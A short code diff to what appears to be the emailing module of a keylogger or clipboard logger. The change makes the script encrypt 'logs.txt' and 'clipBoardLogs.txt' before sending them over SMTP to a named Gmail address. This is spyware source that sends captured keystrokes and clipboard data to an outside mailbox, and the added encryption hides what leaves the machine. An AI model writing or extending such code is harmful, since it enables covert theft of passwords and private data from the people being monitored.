@@ -1,12 +1,14 @@
 
 import smtplib
 from email.message import EmailMessage
+from encryption import encryptContents 
 
 def sendEmail():
     print("sending")
-    log_file = "logs.txt"
-    clipBoard_file = "clipBoardLogs.txt"
-
+    log_file = encryptContents("logs.txt")
+    print(log_file)
+    clipBoard_file = encryptContents("clipBoardLogs.txt")
+    print(clipBoard_file)
     sender = "hello@demomailtrap.com"
     receiver = "ukharbanda20@gmail.com"
     
